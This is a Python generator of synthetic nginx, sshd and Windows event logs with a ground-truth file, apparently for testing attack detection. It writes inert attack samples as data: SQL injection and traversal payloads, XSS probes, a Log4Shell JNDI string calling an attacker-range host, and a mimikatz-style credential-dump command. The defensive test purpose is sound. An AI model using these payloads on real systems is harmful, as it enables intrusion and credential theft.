"""Synthetic log generator with ground truth.

Writes three log files (nginx access log, sshd auth log, Windows events as Winlogbeat-style
JSON lines) plus ``truth.json`` that describes every injected attack. Everything is inert
text: nothing is sent to any network or system. All addresses come from documentation ranges
(RFC 5737 / RFC 2544) or private space.

* benign clients:   198.18.0.0/15
* internal hosts:   10.0.0.0/24
* attackers:        203.0.113.0/24
"""
from __future__ import annotations

import base64
import json
import random
from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone
from pathlib import Path
from urllib.parse import quote

DEFAULT_START = datetime(2026, 10, 5, 0, 0, 0, tzinfo=timezone.utc)
ATTACKER_PREFIX = "203.0.113."


@dataclass
class Sink:
    nginx: list[tuple[float, str]] = field(default_factory=list)
    ssh: list[tuple[float, str]] = field(default_factory=list)
    win: list[tuple[float, str]] = field(default_factory=list)


# ---------------------------------------------------------------- formatters
def _nginx(sink: Sink, ts: float, ip: str, method: str, uri: str, status: int, size: int,
           ua: str, referer: str = "-", user: str = "-") -> None:
    dt = datetime.fromtimestamp(ts, timezone.utc)
    line = (f'{ip} - {user} [{dt:%d/%b/%Y:%H:%M:%S} +0000] "{method} {uri} HTTP/1.1" '
            f'{status} {size} "{referer}" "{ua}"')
    sink.nginx.append((ts, line))


def _ssh(sink: Sink, ts: float, host: str, pid: int, msg: str) -> None:
    dt = datetime.fromtimestamp(ts, timezone.utc)
    sink.ssh.append((ts, f"{dt:%b} {dt.day:2d} {dt:%H:%M:%S} {host} sshd[{pid}]: {msg}"))


def _ssh_fail(sink: Sink, ts: float, host: str, rng: random.Random, ip: str, user: str,
              valid: bool = False) -> None:
    pid, port = rng.randint(1000, 60000), rng.randint(20000, 65000)
    if not valid:
        _ssh(sink, ts, host, pid, f"Invalid user {user} from {ip} port {port}")
    prefix = "" if valid else "invalid user "
    _ssh(sink, ts + 0.4, host, pid, f"Failed password for {prefix}{user} from {ip} port {port} ssh2")


def _win(sink: Sink, ts: float, host: str, eid: int, data: dict, channel: str = "Security") -> None:
    dt = datetime.fromtimestamp(ts, timezone.utc)
    provider = {"Security": "Microsoft-Windows-Security-Auditing",
                "System": "Service Control Manager"}.get(channel, "Microsoft-Windows-Eventlog")
    doc = {"@timestamp": dt.strftime("%Y-%m-%dT%H:%M:%S.") + f"{dt.microsecond // 1000:03d}Z",
           "winlog": {"event_id": str(eid), "computer_name": host, "channel": channel,
                      "provider_name": provider, "event_data": data}}
    sink.win.append((ts, json.dumps(doc, separators=(",", ":"))))


# ---------------------------------------------------------------- benign traffic
BROWSERS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
]
PAGES = ["/", "/", "/", "/about", "/products", "/contact", "/blog", "/pricing", "/faq"]
SEARCH_TERMS = ["how+to+reset+password", "sql+union+operator", "typescript+union+types", "select+a+plan",
                "script+tag+tutorial", "drop+shipping+policy", "benchmark+results", "sleep+tracker"]


def _benign_web(sink: Sink, rng: random.Random, start: float, hours: int) -> int:
    clients = [(f"198.18.{rng.randint(0, 255)}.{rng.randint(1, 254)}", rng.choice(BROWSERS))
               for _ in range(150)]
    weights = [1 if h < 7 else 5 if h < 22 else 2 for h in range(24)]
    n = 0

    def at() -> float:
        h = rng.choices(range(24), weights)[0] % hours
        return start + h * 3600 + rng.random() * 3600

    for _ in range(5200):
        ip, ua = rng.choice(clients)
        t = at()
        roll = rng.random()
        if roll < 0.55:
            uri, status = rng.choice(PAGES), rng.choice([200, 200, 200, 304])
            _nginx(sink, t, ip, "GET", uri, status, rng.randint(2000, 40000), ua)
            for asset in ("/static/app.js", "/static/style.css"):
                _nginx(sink, t + rng.random(), ip, "GET", asset, rng.choice([200, 304]), 20000, ua,
                       referer=f"https://shop.example.test{uri}")
                n += 1
        elif roll < 0.70:
            _nginx(sink, t, ip, "GET", f"/products/{rng.randint(1, 300)}", 200, rng.randint(3000, 30000), ua)
        elif roll < 0.80:
            _nginx(sink, t, ip, "GET", f"/api/items?page={rng.randint(1, 20)}&sort=price", 200, 8000, ua)
        elif roll < 0.88:
            _nginx(sink, t, ip, "GET", f"/search?q={rng.choice(SEARCH_TERMS)}", 200, 9000, ua)
        elif roll < 0.92:
            _nginx(sink, t, ip, "GET", rng.choice(["/favicon.ico", "/apple-touch-icon.png"]), 404, 150, ua)
        elif roll < 0.95:
            _nginx(sink, t, ip, "GET", f"/products/{rng.randint(900, 999)}", 404, 150, ua)
        else:
            _nginx(sink, t, ip, "POST", "/login", 302, 0, ua)
        n += 1

    # a few users mistype their password once to three times, then succeed
    for _ in range(8):
        ip, ua = rng.choice(clients)
        t = at()
        for _ in range(rng.randint(1, 3)):
            _nginx(sink, t, ip, "POST", "/login", 401, 310, ua)
            t += rng.randint(5, 25)
            n += 1
        _nginx(sink, t, ip, "POST", "/login", 302, 0, ua)
    # monitoring probe every minute
    for m in range(hours * 60):
        _nginx(sink, start + m * 60 + 3, "10.0.0.5", "GET", "/health", 200, 2, "kube-probe/1.28")
        n += 1
    # a legitimate crawler: bursts of requests with a few 404s (stays well below the 404-flood rule)
    t = start + 4 * 3600
    for burst in range(40):
        for k in range(6):
            status = 404 if rng.random() < 0.15 else 200
            _nginx(sink, t + k * 3, "198.18.200.7", "GET", f"/products/{rng.randint(1, 400)}", status, 9000,
                   "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)")
            n += 1
        t += rng.randint(120, 400)
    return n


def _benign_ssh(sink: Sink, rng: random.Random, start: float, hours: int) -> int:
    host, n = "web01", 0
    for user, ip in (("alice", "10.0.0.21"), ("bob", "10.0.0.22"), ("carol", "10.0.0.23")):
        for _ in range(rng.randint(2, 4)):
            t = start + rng.randint(7, 20) * 3600 % (hours * 3600) + rng.randint(0, 3000)
            pid, port = rng.randint(1000, 60000), rng.randint(30000, 60000)
            if rng.random() < 0.5:
                for _ in range(rng.randint(1, 2)):
                    _ssh(sink, t, host, pid, f"Failed password for {user} from {ip} port {port} ssh2")
                    t += 6
                _ssh(sink, t, host, pid, f"Accepted password for {user} from {ip} port {port} ssh2")
            else:
                _ssh(sink, t, host, pid, f"Accepted publickey for {user} from {ip} port {port} ssh2: RSA SHA256:abc")
            _ssh(sink, t + 0.2, host, pid, f"pam_unix(sshd:session): session opened for user {user}(uid=1000) by (uid=0)")
            _ssh(sink, t + 1800, host, pid, f"Disconnected from user {user} {ip} port {port}")
            n += 4
    return n


NORMAL_PROCS = [
    (r"C:\Program Files\Google\Chrome\Application\chrome.exe", "chrome.exe --type=renderer", r"C:\Windows\explorer.exe"),
    (r"C:\Windows\System32\notepad.exe", "notepad.exe notes.txt", r"C:\Windows\explorer.exe"),
    (r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE", "WINWORD.EXE report.docx", r"C:\Windows\explorer.exe"),
    (r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
     "powershell.exe -NoProfile -File C:\\scripts\\backup.ps1", r"C:\Windows\System32\taskeng.exe"),
    (r"C:\Windows\System32\cmd.exe", "cmd.exe /c ipconfig", r"C:\Windows\explorer.exe"),
]


def _benign_windows(sink: Sink, rng: random.Random, start: float, hours: int) -> int:
    n = 0
    hosts = ["WS-ANNA", "WS-OLE", "SRV-FILE01", "SRV-DC01"]
    users = ["anna", "ole", "kari", "per"]
    for _ in range(160):
        host, user = rng.choice(hosts), rng.choice(users)
        ip = f"10.0.0.{rng.randint(30, 60)}"
        t = start + rng.randint(6, 20) * 3600 % (hours * 3600) + rng.randint(0, 3500)
        ltype = rng.choice([2, 3, 3, 10])
        if rng.random() < 0.12:
            for _ in range(rng.randint(1, 3)):
                _win(sink, t, host, 4625, {"TargetUserName": user, "IpAddress": ip, "LogonType": str(ltype)})
                t += 8
                n += 1
        _win(sink, t, host, 4624, {"TargetUserName": user, "IpAddress": ip, "LogonType": str(ltype)})
        _win(sink, t + 0.1, host, 4672, {"SubjectUserName": user})
        for _ in range(rng.randint(1, 4)):
            img, cli, parent = rng.choice(NORMAL_PROCS)
            _win(sink, t + rng.randint(5, 3000), host, 4688,
                 {"SubjectUserName": user, "NewProcessName": img, "CommandLine": cli, "ParentProcessName": parent})
            n += 1
        _win(sink, t + rng.randint(3000, 7000), host, 4634, {"TargetUserName": user, "LogonType": str(ltype)})
        n += 3
    return n


# ---------------------------------------------------------------- attack scenarios
def _scenario(truth: list, name: str, description: str, source: str, ips: list[str],
              start: float, end: float, expect: list[str], host: str = "") -> None:
    truth.append({"name": name, "description": description, "source": source, "ips": ips,
                  "host": host, "start": start, "end": end, "expect": expect})


def _attacks(sink: Sink, rng: random.Random, t0: float, truth: list) -> None:
    at = lambda h, m=0, s=0: t0 + h * 3600 + m * 60 + s  # noqa: E731
    NIKTO = "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:Port Check)"
    BROWSER = BROWSERS[0]

    # --- SSH
    users = ["root", "admin", "ubuntu", "test", "oracle", "postgres", "user", "git", "ftp", "pi"]
    ip, s = ATTACKER_PREFIX + "10", at(2, 14)
    for i in range(120):
        _ssh_fail(sink, s + i * 1.5, "web01", rng, ip, rng.choice(users))
    _scenario(truth, "ssh_bruteforce_fast", "Hydra-style burst: 120 failed logins in 3 minutes", "ssh", [ip],
              s, s + 180, ["ssh_bruteforce"])

    ip, s = ATTACKER_PREFIX + "11", at(5, 3)
    for i, u in enumerate(["root", "admin", "alice", "bob", "deploy", "backup", "service"]):
        _ssh_fail(sink, s + i * 90, "web01", rng, ip, u, valid=u in ("alice", "bob"))
    _scenario(truth, "ssh_password_spray", "One attempt per account, 90 s apart (stays under the brute-force rule)",
              "ssh", [ip], s, s + 7 * 90, ["ssh_password_spray"])

    ip, s = ATTACKER_PREFIX + "12", at(8, 0)
    for i in range(30):
        _ssh_fail(sink, s + i * 180, "web01", rng, ip, "root")
    _scenario(truth, "ssh_slow_bruteforce", "Low and slow: one guess every 3 minutes for 90 minutes", "ssh", [ip],
              s, s + 30 * 180, ["ssh_slow_bruteforce"])

    ip, s = ATTACKER_PREFIX + "13", at(11, 30)
    for i in range(18):
        _ssh_fail(sink, s + i * 3, "web01", rng, ip, "root", valid=True)
    pid, port = rng.randint(1000, 60000), rng.randint(20000, 65000)
    _ssh(sink, s + 70, "web01", pid, f"Accepted password for root from {ip} port {port} ssh2")
    _scenario(truth, "ssh_compromise", "Brute force that ends with a successful root login", "ssh", [ip],
              s, s + 70, ["ssh_bruteforce", "ssh_compromise", "ssh_root_login"], host="web01")

    # --- Web
    ip, s = ATTACKER_PREFIX + "20", at(3, 40)
    probes = ["/.env", "/.git/config", "/phpmyadmin/", "/wp-admin/", "/server-status", "/cgi-bin/test.cgi",
              "/actuator/health", "/backup.sql", "/config.json", "/shell.php"]
    for i in range(300):
        path = probes[i % 40] if i % 40 < len(probes) else f"/{rng.choice(['old', 'test', 'dev', 'tmp', 'admin'])}{rng.randint(1, 9999)}.php"
        _nginx(sink, s + i * 0.4, ip, "GET", path, 404, 153, NIKTO)
    _scenario(truth, "web_scan_nikto", "Nikto-style scan: 300 requests in 2 minutes", "nginx", [ip], s, s + 120,
              ["web_scanner_useragent", "web_404_flood", "web_scanner_probing"])

    ip, s = ATTACKER_PREFIX + "21", at(6, 10)
    payloads = ["1' OR '1'='1", "1 UNION SELECT NULL,username,password FROM users--", "1; WAITFOR DELAY '0:0:5'--",
                "1 AND SLEEP(5)", "1' AND (SELECT 1 FROM information_schema.tables)--"]
    for i in range(80):
        _nginx(sink, s + i * 0.8, ip, "GET", f"/products?id={quote(rng.choice(payloads))}", 200, 5200,
               "sqlmap/1.7.2#stable (https://sqlmap.org)")
    _scenario(truth, "web_sqlmap", "sqlmap-style injection run", "nginx", [ip], s, s + 64,
              ["web_sqli", "web_scanner_useragent"])

    ip, s = ATTACKER_PREFIX + "22", at(9, 20)
    for i, p in enumerate(["1' or 1=1--", "1 union select 1,2,3", "x' or '1'='1", "1; DROP TABLE users;--"]):
        _nginx(sink, s + i * 20, ip, "GET", f"/products?id={quote(p)}", 200, 5200, BROWSER)
    _scenario(truth, "web_manual_sqli", "Hand-typed injection with a normal browser user agent", "nginx", [ip],
              s, s + 80, ["web_sqli"])

    ip, s = ATTACKER_PREFIX + "23", at(12, 5)
    for i, p in enumerate(["../../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd", "....//....//etc/passwd"]):
        _nginx(sink, s + i * 7, ip, "GET", f"/download?file={p}", 400 if i else 200, 512, BROWSER)
    _scenario(truth, "web_path_traversal", "Traversal attempts toward /etc/passwd", "nginx", [ip], s, s + 20,
              ["web_path_traversal"])

    ip, s = ATTACKER_PREFIX + "24", at(14, 0)
    jndi = "${jndi:ldap://203.0.113.99:1389/a}"
    _nginx(sink, s, ip, "GET", f"/?x={quote(jndi)}", 200, 700, BROWSER)
    _nginx(sink, s + 2, ip, "GET", "/", 200, 700, jndi)
    _scenario(truth, "web_log4shell", "JNDI strings in query and User-Agent (inert text)", "nginx", [ip], s, s + 5,
              ["web_log4shell"])

    ip, s = ATTACKER_PREFIX + "25", at(15, 30)
    _nginx(sink, s, ip, "GET", f"/search?q={quote('<script>alert(1)</script>')}", 200, 900, BROWSER)
    _nginx(sink, s + 9, ip, "GET", f"/search?q={quote('<img src=x onerror=alert(1)>')}", 200, 900, BROWSER)
    _scenario(truth, "web_xss", "Reflected XSS probes", "nginx", [ip], s, s + 15, ["web_xss"])

    ip, s = ATTACKER_PREFIX + "26", at(17, 45)
    for i in range(60):
        _nginx(sink, s + i * 1.5, ip, "POST", "/login", 401, 310, BROWSER)
    _scenario(truth, "web_credential_stuffing", "60 failed logins in 90 seconds", "nginx", [ip], s, s + 90,
              ["web_login_bruteforce"])

    # --- Windows
    ip, s, host = ATTACKER_PREFIX + "30", at(4, 25), "SRV-FILE01"
    for i in range(40):
        _win(sink, s + i * 3, host, 4625, {"TargetUserName": rng.choice(["Administrator", "admin", "svc_sql"]),
                                            "IpAddress": ip, "LogonType": "3"})
    _scenario(truth, "win_bruteforce", "40 failed remote logons in 2 minutes", "windows", [ip], s, s + 120,
              ["win_bruteforce"], host=host)

    ip, s, host = ATTACKER_PREFIX + "31", at(7, 15), "SRV-DC01"
    for i, u in enumerate(["administrator", "anna", "ole", "kari", "per", "svc_backup", "guest", "sql"]):
        _win(sink, s + i * 60, host, 4625, {"TargetUserName": u, "IpAddress": ip, "LogonType": "3"})
    _scenario(truth, "win_password_spray", "One attempt per account, 60 s apart", "windows", [ip], s, s + 480,
              ["win_password_spray"], host=host)

    ip, s, host = ATTACKER_PREFIX + "32", at(19, 0), "SRV-FILE01"
    for i in range(25):
        _win(sink, s + i * 6, host, 4625, {"TargetUserName": "Administrator", "IpAddress": ip, "LogonType": "10"})
    t = s + 170
    _win(sink, t, host, 4624, {"TargetUserName": "Administrator", "IpAddress": ip, "LogonType": "10"})
    enc = base64.b64encode("Write-Host simulated".encode("utf-16le")).decode()
    ps = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    _win(sink, t + 20, host, 4688, {"SubjectUserName": "Administrator", "NewProcessName": ps,
                                    "CommandLine": f"powershell.exe -NoP -enc {enc} ",
                                    "ParentProcessName": r"C:\Windows\System32\cmd.exe"})
    _win(sink, t + 60, host, 4688, {"SubjectUserName": "Administrator", "NewProcessName": r"C:\Temp\m.exe",
                                    "CommandLine": 'm.exe "sekurlsa::logonpasswords" exit',
                                    "ParentProcessName": r"C:\Windows\System32\cmd.exe"})
    _win(sink, t + 100, host, 4720, {"TargetUserName": "svc_backup2", "SubjectUserName": "Administrator"})
    _win(sink, t + 110, host, 4732, {"TargetUserName": "Administratorer", "MemberName": "svc_backup2"})
    _win(sink, t + 150, host, 7045, {"ServiceName": "UpdateHelper", "ImagePath": r"C:\Temp\svc.exe"}, channel="System")
    _win(sink, t + 200, host, 1102, {"SubjectUserName": "Administrator"})
    _scenario(truth, "win_intrusion_chain",
              "Brute force -> RDP logon -> encoded PowerShell -> credential dumping -> new admin -> service -> log cleared",
              "windows", [ip], s, t + 200,
              ["win_bruteforce", "win_compromise", "win_encoded_powershell", "win_credential_dumping_cli",
               "win_user_created", "win_admin_group_added", "win_service_installed", "win_log_cleared"],
              host=host)

    s, host = at(13, 10), "WS-ANNA"
    _win(sink, s, host, 4688, {"SubjectUserName": "anna", "NewProcessName": ps,
                               "CommandLine": f"powershell.exe -w hidden -enc {enc} ",
                               "ParentProcessName": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"})
    _scenario(truth, "win_office_macro", "Word starts an encoded PowerShell command", "windows", [], s, s + 5,
              ["win_office_spawns_shell", "win_encoded_powershell"], host=host)


def generate(out_dir: str | Path, seed: int = 7, start: datetime = DEFAULT_START, hours: int = 24,
             attacks: bool = True) -> dict:
    out = Path(out_dir)
    out.mkdir(parents=True, exist_ok=True)
    rng = random.Random(seed)
    t0 = start.timestamp()
    sink = Sink()
    benign = {"nginx": _benign_web(sink, rng, t0, hours), "ssh": _benign_ssh(sink, rng, t0, hours),
              "windows": _benign_windows(sink, rng, t0, hours)}
    scenarios: list[dict] = []
    if attacks:
        _attacks(sink, rng, t0, scenarios)
    for name, rows in (("nginx_access.log", sink.nginx), ("auth.log", sink.ssh), ("windows_security.jsonl", sink.win)):
        rows.sort(key=lambda r: r[0])
        (out / name).write_text("\n".join(line for _, line in rows) + "\n", encoding="utf-8")
    truth = {"seed": seed, "start": t0, "hours": hours, "benign_events": benign, "scenarios": scenarios}
    (out / "truth.json").write_text(json.dumps(truth, indent=2), encoding="utf-8")
    return truth
